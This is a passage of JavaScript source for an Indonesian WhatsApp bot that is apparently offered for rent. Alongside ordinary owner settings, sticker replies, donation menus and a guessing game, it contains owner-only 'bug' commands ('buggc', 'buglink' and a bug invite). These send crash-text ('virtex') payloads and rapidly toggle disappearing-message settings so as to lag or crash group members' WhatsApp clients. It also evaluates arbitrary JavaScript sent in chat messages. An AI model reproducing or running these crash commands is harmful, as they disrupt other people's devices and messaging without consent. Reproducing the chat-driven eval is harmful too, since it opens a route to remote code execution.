"groupName": `HANZ々OFC彡 [🎭]🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${virtex7(prefix)}😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠😠${api(prefix)}️️`,
"thumbnail": virgam,           //INI JUGA GW TAMBAHIN VIRTEX BIAR GANAS WKWK ASu
"caption": `BUG INVITE🎭 BY : HANZ々OFC彡`,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted:ftrol, contextInfo:{}})
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
Hanz.relayWAMessage(res)
await setTimeout(() => {
}, 3000)
break
case 'buggc'://BUG OLD VERSI GW SOALNYA BASE INI GK SUPPOT BUGGC 
//NEMU EVAL NYA SUSAH ASW
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(7 * 24 * 60 * 60),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(7 * 24 * 60 * 60),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(7 * 24 * 60 * 60),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(7 * 24 * 60 * 60),{}),{ waitForAck: true });
break       
   
case 'buglink':
                if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
                var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
              Hanz.sendMessage(from, virtex7(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}${virtex7(prefix)}${virtex9(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/Manik.png",
                "thumbnail": fs.readFileSync(`./media/thumnail.jpg`),
                "sourceUrl": "https://www.instagram.com/invites/contact/?i=1px0y5705mg05&utm_content=kkko0zr"}}})
                break             
//~~~~~~~~~~~~~~~~~~~~~[FITUR OWNER]~~~~~~~~~~~~~~~~~~~~~//
case 'addcmd': 
case 'setcmd':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (isQuotedSticker) {
if (!q) return reply(`Penggunaan :  cmdnya dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
replyy("Done Bwang")
} else {
replyy('tag stickenya')
}
break
// Del Cmd ( HW MODS WA )
case 'delcmd':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
replyy("Done Bwang")
break
case 'listcmd':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd :* ${i.chats}`
}
replyy(teksnyee)
break
case 'autoread':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readG === true) return
readG = true
replyy(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readG === false) return
readG = false
replyy(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readP === true) return
readP = true
replyy(`Succes mengaktifkan autoread pribadi`)
} else if (args[1] === "off") {
if (readP === false) return
readP = false
replyy(`Succes mematikan autoread pribadi`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break                  
case 'auto':{
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!q) return 
if (
args[0].toLowerCase() === 'ngetik' ||
args[0].toLowerCase() === 'ketik' ||
args[0].toLowerCase() === 'typing'
									){
ngetik = true
autovn = false
replyy(`Sukses....`)
} else if (
args[0].toLowerCase() === 'voicenote' ||
args[0].toLowerCase() === 'recording' ||
args[0].toLowerCase() === 'vn' 
){
ngetik = false
autovn = true
replyy(`Sukses...`)
} else {
}
}
break
case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
reply(`_Restarting ${botname}_`)
exec(`cd &&  node index`)
sleep(4000)
replyy('Sukses')
break								
case 'set' :
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
but = [
{ buttonId: '.self', buttonText: { displayText: 'Self' }, type: 1 },
{ buttonId: '.public', buttonText: { displayText: 'Public' }, type: 1 }
]
sendButton(from, "Silahkan pilih self/public Di Bawah", faketeks, but, mek)
break
case 'setppbot':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await Hanz.downloadMediaMessage(boij)
fs.writeFileSync(`./media/thumnail.jpg`, delb)
fakeimage = fs.readFileSync(`./media/thumnail.jpg`)
replyy(`Sukses cok`)
break
case 'setppwa':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
Hanz.updatePresence(from, Presence.composing) 
if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Hanz.downloadAndSaveMediaMessage(enmedia)
await Hanz.updateProfilePicture(botNumber, media)
reply('SUKSES!!!')			  
break		
case 'public':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
publik = true
replyy('Sukses mengubah mode self ke public')
break
case 'self':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
publik = false
replyy('Sukses mengubah mode public ke self')
break
case 'owner':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
members_ids = []
for (let mem of groupMembers) {
members_ids.push(mem.jid)
}
vcard2 = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator ${ownername} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
Hanz.sendMessage(from, {displayName: `kontol`, vcard: vcard2}, contact, 
{ quoted: ftrol, 
})
reply('TUHH NOMER OWNER KU')
break
case 'sosmed':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
teks =
`┏━➤ 「 All Sosmed 👥」
┃┃✯ INSTAGRAM : wong_koclok_
┃┃✯ YOU TUBE : HANZ々OFC彡
┃┃✯ GITHUB : HARISGANZ
┗━━━━━━━`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [
{ buttonId: `${prefix}follow`, buttonText: { displayText: 'FOLLOW' }, type: 1 },
{ buttonId: `${prefix}subscribe`, buttonText: { displayText: 'SUBSCRIBE' }, type: 1 },
{ buttonId: `${prefix}sc`, buttonText: { displayText: 'GITHUB' }, type: 1 }
]
sendButImage(from, teks, "©ʜᴀɴᴢ々ᴏꜰᴄ", gam, but)
break
case 'follow':
reply('https://www.instagram.com/invites/contact/?i=1kn')
break
case 'yt':
reply('https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw')
break
case 'info':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
teks =
`┏━➤ 「 INFO NE COK 」
┃┃✯ Nama Bot : ${botname}
┃┃✯ Prefix : Multi
┃┃✯ Platform : Ubuntu Linux
┃┃✯ Runtime : ${runtime(process.uptime())}
┃┃✯ Sc Bot : https://youtube.com/channel/HANZ々OFC彡
┗━━━━━━━`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [
{ buttonId: `${prefix}menu`, buttonText: { displayText: 'BACK TO MENU' }, type: 1 },
{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }
]
sendButImage(from, teks, "©ʜᴀɴᴢ々ᴏꜰᴄ", gam, but)
break
case 'sc':
case 'script':
case 'sourcecode':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})

var nom = mek.participant
members_id = []
anu =`
❏SCRIPT❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
══{*LINK SCRIPT*}══
┏━━⊱
┣❏ http://bit.ly/3vJZJ7n
┗━━⊱
══{*YOU TUBE*}══
┏━━⊱
┣❏ https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`
but = [
{ buttonId: `${prefix}menu`, buttonText: { displayText: 'OK TQ' }, type: 1 },
{ buttonId: `${prefix}sewabot`, buttonText: { displayText: 'SEWA BOT' }, type: 1 },
]
sendButton(from, anu, faketeks, but, mek)
break
      
case 'donasi':
teks = `Kalo Gk ikhlas Ngak usah donasi:v

Makasih Kalo Mau Donasi Beneran
Semoga Rejekinya Tambah Lancar Amin

╔═════════════════⎉
║冬GOPAY : 083144394823
║冬DANA : 083144394823
║冬OVO : 083144394823
║冬PULSA : 083144394823
║冬SAWERIA : https://saweria.co/harisnew
╚═════════════════❍ `
gam = fs.readFileSync('./media/sewabot.jpg')
but = [         
          { buttonId: `${prefix}info`, buttonText: { displayText: 'INFO' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }
        ]
        sendButImage(from, teks, "HANZ々OFC彡", gam, but)
break
case 'sewabot':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
teks =
`╔══❒LIST JASA WA BOT❒══⎉
║冬Seminggu : 5.000
║冬Sebulan : 10.000
║冬Permanen : 15.000
╚═══════════════════❍ 
╔═════❒FITUR BOT❒═════⎉
║冬STICKER
║冬WELCOME GG
║冬ANTIVIRTEX
║冬ANTILINK
║冬BUAT JAGA GRUP
║冬DLL
╚═══════════════════❍ 
╔══❒KEUNGGULAN BOT❒══⎉
║冬SELALU UPDATE
║冬ON 24 JAM
╚═══════════════════❍ 
Jika Ingin Sewa Bot
Silahkan Pilih Metode Pembayaran
Dibawah Ini`
gam = fs.readFileSync('./media/sewabot.jpg')
but = [
          { buttonId: `${prefix}gopay`, buttonText: { displayText: 'GOPAY' }, type: 1 },
          { buttonId: `${prefix}dana`, buttonText: { displayText: 'DANA' }, type: 1 },
          { buttonId: `${prefix}ovo`, buttonText: { displayText: 'OVO' }, type: 1 }
        ]
        sendButImage(from, teks, "Pilih Metode Pembayarannya🤑", gam, but)
break
case 'gopay':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'DONE' }, type: 1 }
]
sendButton(from, `GOPAY : 0${Nogopay}`, faketeks, but, mek)
break
case 'dana':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'DONE' }, type: 1 }
]
sendButton(from, `DANA : 0${Nodana}`, faketeks, but, mek)
break
case 'ovo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'DONE' }, type: 1 }
]
sendButton(from, `OVO : 0${Noovo}`, faketeks, but, mek)
break
case "runtime":
case "test":
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
run = process.uptime();
teks = `${kyun(run)}`;
replyy(teks);
break;
case "speed":
case "ping":
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
const timestamp = speed();
const latensi = speed() - timestamp;
exec(`neofetch --stdout`, (error, stdout, stderr) => {
const child = stdout.toString("utf-8");
const ssd = child.replace(/Memory:/, "Ram:");
const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
reply(pingnya);
});
break;
   
case 'verify':
const serialUser = createSerial(18)
veri = sender
_registered.push(sender)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
const ara = fs.readFileSync('./media/stickerr/verify.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
break
case 'donasi':
teks = `Mau Donasi Apa Liat Doank ?
Klo Mau Donasi Pilih Aja Di Bawah

Makasih Kalo Mau Donasi Beneran
Semoga Rejekinya Tambah Lancar Amin

    ╭───────────────❏
❍┤ヅ Gopay : 083144394823
❍┤ヅ Pulsa : 083144394823
❍┤ヅSaweria : https://saweria.co/harisnew
    ╰───────────────❏`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: 'BACK TO MENU' }, type: 1 },
          { buttonId: `${prefix}info`, buttonText: { displayText: 'INFO' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }
        ]
        sendButImage(from, teks, "©ʜᴀɴᴢ々ᴏꜰᴄ", gam, but)
break
case 'tebakgambar':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/tebakgambar?apikey=Ikyy69`, {method: 'get'})
ngebuff = await getBuffer(anu.img)
tebak = `Jawaban : *${anu.jawaban}*`
setTimeout( () => {
Hanz.sendMessage(from, tebak, text, {quoted: ftrol})
}, 60000) // 1000 = 1s,
setTimeout( () => {
Hanz.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
Hanz.sendMessage(from, '_20 Detik lagi..._', text)
}, 40000) // 1000 = 1s,
setTimeout( () => {
Hanz.sendMessage(from, '_30 Detik lagi..._', text) 
}, 30000) // 1000 = 1s,
setTimeout( () => {
Hanz.sendMessage(from, '_40 Detik lagi..._', text) 
}, 20000) // 1000 = 1s,
setTimeout( () => {
Hanz.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
Hanz.sendMessage(from, '_60 Detik lagi..._', text) 
}, 2500) // 1000 = 1s,
setTimeout( () => {
Hanz.sendMessage(from, ngebuff, image, { caption: '_Tebak bro!!! gak bisa jawab wajib subrek zero yt7 :v_', quoted: ftrol }) 
}, 0) // 1000 = 1s,
break
//━━━━━━━━━━━━━━━[ AKHIR SEMUA FITUR ]━━━━━━━━━━━━━━━━━//
//AUTO VN & AUTO STICKER
default:
if (budy.includes(`bokep`)) {
const ara = fs.readFileSync('./media/mp3/bokep.mp3');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`Bokep`)) {
const ara = fs.readFileSync('./media/mp3/bokep.mp3');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }                  
if (budy.includes(`Mastah`)) {
const ara = fs.readFileSync('./media/sticker/mastah.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`mastah`)) {
const ara = fs.readFileSync('./media/sticker/mastah.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`Ajg`)) {
const ara = fs.readFileSync('./media/sticker/toxic.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`Assalamualaikum`)) {
const ara = fs.readFileSync('./media/sticker/Assalamualaikum.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }               
if (budy.includes(`assalamualaikum`)) {
const ara = fs.readFileSync('./media/sticker/Assalamualaikum.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }                     
if (budy.includes(`ajg`)) {
const ara = fs.readFileSync('./media/sticker/toxic.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`bangsat`)) {
const ara = fs.readFileSync('./media/sticker/toxic.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`kntl`)) {
const ara = fs.readFileSync('./media/sticker/toxic.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`${owner}`,)) {              
                  const ara = fs.readFileSync('./media/sticker/tag.webp');
                  Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (isOwner) {
			if (budy.startsWith('>')) {
				console.log(color('[EVAL1]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					reply(`${evaled}`)
				} catch (err) {
					reply(`${err}`)
				}
			} else if (budy.startsWith('x')) {
				console.log(color('[EVAL2]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
				try {
					return Hanz.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: ftrol })
				} catch (err) {
					e = String(err)
					reply(e)
				}
			}
		}
		}
		fin = process.uptime()
        if (!mek.hasNewMessage) return Hanz.setStatus(`Runtime ${runtime(process.uptime())} | prefix ${prefix} | ${asutes}`)
        mek = mek.messages.all()[0]
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}
//SCRIPT BY HANZ々OFC彡
//PRIVATE TEAM
/*TQ TO
GW SENDIRI/HARIS
MOONA SENPAI
RAFFI
WILDAN 
BRUTAL 
SAWALY
PUTRA
PAK TYZ
RAGIL GAY
XFAA Xenpai
MBOH LIANE NUMPANG SC
*/

	
    
